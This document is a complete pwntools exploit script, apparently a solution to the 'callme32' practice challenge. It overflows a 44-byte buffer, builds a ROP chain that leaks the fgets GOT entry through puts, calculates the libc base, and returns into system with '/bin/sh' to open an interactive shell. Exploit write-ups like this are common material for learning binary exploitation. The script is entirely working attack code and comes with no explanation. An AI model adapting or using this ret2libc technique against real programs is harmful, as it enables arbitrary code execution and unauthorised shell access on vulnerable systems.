from pwn import *
target=process('./callme32')
elf=ELF('callme32')
libc=elf.libc

print(target.recvuntil("...\n> "))
fgets_got=0x0804a010
puts_plt=0x080485d0
popret=0x08048579
pwnme=0x080487B6

payload="A"*44
payload+=p32(puts_plt)
payload+=p32(popret)
payload+=p32(fgets_got)
payload+=p32(pwnme)
payload+=p32(0x0)

target.sendline(payload)
leak=target.recv()[0:4]
libc_fgets=u32(leak+"\x00"*(4-len(leak)))
print(hex(libc_fgets))
libc_base=libc_fgets-libc.symbols["fgets"]
print(hex(libc_base))
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()

payload="A"*44
payload+=p32(libc_system)
payload+=p32(0xdeadbeef)
payload+=p32(libc_binsh)
payload+=p32(0x0)

target.sendline(payload)
target.interactive()
